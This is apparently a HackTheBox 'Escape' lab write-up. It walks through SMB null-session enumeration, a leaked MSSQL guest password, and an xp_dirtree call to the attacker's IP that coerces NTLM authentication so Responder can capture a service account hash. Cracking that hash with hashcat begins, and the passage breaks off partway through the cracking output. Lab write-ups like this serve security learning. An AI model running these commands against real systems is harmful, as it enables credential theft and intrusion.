---
layout:     post
title:      "HackTheBox - Escape"
subtitle:   "Write-Up"
date:       2023-06-19
author:     "D4mianwayne"
tags:    ["smb, windows, mssql-server, hashcat, evil-winrm, Responder.py"]
categories: ["HackTheBox"]
theme: blink
img:  "/img/htb.png"
layout: "simple"

---


This machine was medium level windows which involves SQL Server interaction, then using Responder to capture the hash of the `sqlsvc` user and then enumerating files on the system, from there obtaining password for another user and in the end taking advantage of a vulnerable ADCS Template to gain Administrator access.

<!-- more -->

# Escape
Starting off with the `nmap` scan:

```asm
# Nmap 7.92 scan initiated Sat Apr 29 16:23:48 2023 as: nmap -sV -sC -A -Pn -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389 -o nmap_ports -vv -Pn 10.10.11.202
Nmap scan report for 10.10.11.202 (10.10.11.202)
Host is up, received user-set (0.075s latency).
Scanned at 2023-04-29 16:23:49 UTC for 88s

PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-04-30 00:23:57Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-30T00:25:18+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f 7f54 b2ed ff74 708d 1a6d df34 b9bd
| SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4
| MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv
| mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0
| icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p
| Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo
| fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl
| 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7
| lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl
| cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj
| LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+
| /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed
| RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC
| frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r
| nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb
| Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ=
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-30T00:25:18+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f 7f54 b2ed ff74 708d 1a6d df34 b9bd
| SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4
| MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv
| mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0
| icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p
| Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo
| fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl
| 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7
| lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl
| cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj
| LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+
| /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed
| RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC
| frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r
| nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb
| Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ=
|_-----END CERTIFICATE-----
1433/tcp open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-04-29T14:16:25
| Not valid after:  2053-04-29T14:16:25
| MD5:   86e6 d4f8 e109 b3d4 5984 6875 77b0 16e9
| SHA-1: 8466 a6c0 518b edef ec9b bd6f 9463 c08b 3374 b29e
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQFR0DCpyAyYVDB6Lf2J/02DANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjMwNDI5MTQxNjI1WhgPMjA1MzA0MjkxNDE2MjVaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMPBPDvg
| ufJTn2Hc1koyZItXfx7FJKGu9qrc5s+9Du+pd5/kzBr5wEZl84KnV8ocDPpxmoNP
| mI8IKUCp8h33LLciOypjEN4qOuICRuDJDJM62RYsMO4Rivc2qGVYo2mzGXE14/VD
| SCYkK8Q+j+JhUzZX7nA4pnEco/l/LvkvNpgWqA2KieCN+WWg4dW4xYlUl1eBJ1fh
| Zm5l+PhBTWGLTLimnP0maugREGLnmxlQdpE0oMPp3v41yZzJn+GMPBeU26X+trMS
| 2y975KLuHAy+5Kt9sSzTZH3U9eDo3ouXJFkxxfTD8fI+E2QgR01DzNSLLxVTQJM4
| vVo4dAF5VkO4pX0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAnQo9FVql9vODv2iC
| LXcbdSz6Bjpr7TL+1+DUF8rHuoUCpAlIH1qht1BknMTGDkSv++QO1ssXZl9SLySh
| 1E+regE8nMnYqBvfKIzjjbj2KM+A0FXSiRYw+glAqnWJZxHZGK/5Q7og46DgekSK
| 8/dt8KdjCEmdzsNK88EDaUr805ISWQgumAkH8KcSc7EovTTJPTAG07+AlS/fBrdx
| 08MD1qz7smBmccpJgzSeAtcTYsv2QHILv7kxVOXYPhPh4zttq8eaidkXC0JGJrfe
| 13QaC0/lVMkD3zuNfkr5sMuxVZZPrUsYIbXObwek2Vbkip/RvaMQz5BOHzl/SyNJ
| VQR56g==
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   Target_Name: sequel
|   NetBIOS_Domain_Name: sequel
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sequel.htb
|   DNS_Computer_Name: dc.sequel.htb
|   DNS_Tree_Name: sequel.htb
|_  Product_Version: 10.0.17763
|_ssl-date: 2023-04-30T00:25:18+00:00; +8h00m01s from scanner time.
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f 7f54 b2ed ff74 708d 1a6d df34 b9bd
| SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4
| MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv
| mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0
| icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p
| Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo
| fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl
| 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7
| lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl
| cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj
| LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+
| /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed
| RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC
| frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r
| nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb
| Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-04-30T00:25:18+00:00; +8h00m01s from scanner time.
3269/tcp open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f 7f54 b2ed ff74 708d 1a6d df34 b9bd
| SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4
| MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv
| mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0
| icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p
| Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo
| fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl
| 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7
| lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl
| cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj
| LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+
| /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed
| RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC
| frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r
| nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb
| Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-04-30T00:25:17+00:00; +8h00m02s from scanner time.
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        syn-ack .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 63970/tcp): CLEAN (Timeout)
|   Check 2 (port 40602/tcp): CLEAN (Timeout)
|   Check 3 (port 50586/udp): CLEAN (Timeout)
|   Check 4 (port 40313/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2023-04-30T00:24:38
|_  start_date: N/A
|_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m00s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 29 16:25:17 2023 -- 1 IP address (1 host up) scanned in 88.77 seconds
```

We don’t see any HTTP/HTTPS port open, classic AD machine. Starting with SMB port, we can connect to it as NULL user and list out the shares. It can be seen that there is a share named as `Public` , we can access the share and see that it contains one PDF file which we can download to our machine.

```asm
❯ smbclient -L //10.10.11.202/ -U ""
Enter WORKGROUP\'s password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Public          Disk      
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.202 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
❯ smbclient //10.10.11.202/Public -U ""
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 11:51:25 2022
  ..                                  D        0  Sat Nov 19 11:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 13:39:43 2022

		5184255 blocks of size 4096. 1463762 blocks available
smb: \> mget *
Get file SQL Server Procedures.pdf? yes
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (105.7 KiloBytes/sec) (average 105.7 KiloBytes/sec)
```

Checking the PDF, we see that had information about the MSSQL Server

![](/img/Escape_059ec3bec324456ca5e1140eb7edc89f/Untitled.png)

From the PDF, there was an email mentioned for the user `brandon.brown`

```asm

mailto:brandon.brown@sequel.htb
```

At the end of the PDF document, we see that there is a Bonus section and it contained a credential for `PublicUser` which can connect to the MSSQL Server

![](/img/Escape_059ec3bec324456ca5e1140eb7edc89f/Untitled_1.png)

Upon connecting to the MSSQL server as `PublicUser` , we can execute some common queries such for retrieving version, databases and so on. Although, this user did not have any permissions to query any of the mentioned database. But there was a stored procedure called `xp_dirtree` which is used to retrieve a directory from the network or local path and show them as rows/columns. 

```asm
❯ mssqlclient.py PublicUser:'GuestUserCantWrite1'@sequel.htb
Impacket v0.9.25.dev1+20220407.165653.68fd6b79 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
entity_name                                                                                                                        subentity_name                                                                                                                     permission_name                                                

--------------------------------------------------------------------------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   ------------------------------------------------------------   

server                                                                                                                                                                                                                                                                CONNECT SQL                                                    

server                                                                                                                                                                                                                                                                VIEW ANY DATABASE                                              

SQL> SELECT name FROM master.sys.databases
name                                                                                                                               

--------------------------------------------------------------------------------------------------------------------------------   

master                                                                                                                             

tempdb                                                                                                                             

model                                                                                                                              

msdb                                                                                                                               

SQL> xp_dirtree '\\10.10.14.36\a';
subdirectory                                                                                                                                                                                                                                                            depth   

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------
```

I started `[Responder.py](http://Responder.py)` on my system and tried to use `xp_dirtree` to list out the directory share for my IP, what will happen here is the user having the permissions to execute the `xp_dirtree` procedure on the system. Doing so resulted in the connection made over the Responder and had the Net-NTLMv2 has for `sql_svc` user. It's possible that the SQL Server service account (`sql_svc`) is being used to execute the xp_dirtree stored procedure, even though the attacker has logged in as a guest user. In this case, when the victim machine attempts to access the UNC path specified in the xp_dirtree command, it will use the credentials of the SQL Server service account to authenticate to the attacker's machine, instead of using the guest user's credentials.

![](/img/Escape_059ec3bec324456ca5e1140eb7edc89f/Untitled_2.png)

Cracking the captured hash via `hashcat` and using `rockyou.txt` was successful:

```asm
❯ hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt -o sql-svc.netntlmv2.cracked --force
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 3767/3831 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 2
